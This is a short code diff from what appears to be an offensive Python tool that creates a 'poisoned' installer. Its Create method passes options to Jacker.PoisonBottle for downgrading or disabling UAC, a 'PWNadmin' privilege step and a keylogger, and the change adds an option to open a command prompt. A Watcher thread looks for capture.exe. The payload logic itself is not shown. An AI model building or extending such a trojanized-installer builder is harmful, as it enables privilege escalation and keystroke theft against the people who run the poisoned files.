@@ -29,7 +29,7 @@ class Methods():
 
     #Create poisoned file
     def Create():
-        Jacker.PoisonBottle(Methods.installer, includeUACdowngrade.get(), includeUACdisable.get(), includePWNadmin.get(), includeKeylog.get())
+        Jacker.PoisonBottle(Methods.installer, includeUACdowngrade.get(), includeUACdisable.get(), includePWNadmin.get(), includeKeylog.get(), includeOpenCMD.get())
 
     #Launch thread that will look for capture.exe to launch and send notification
     def Watcher():
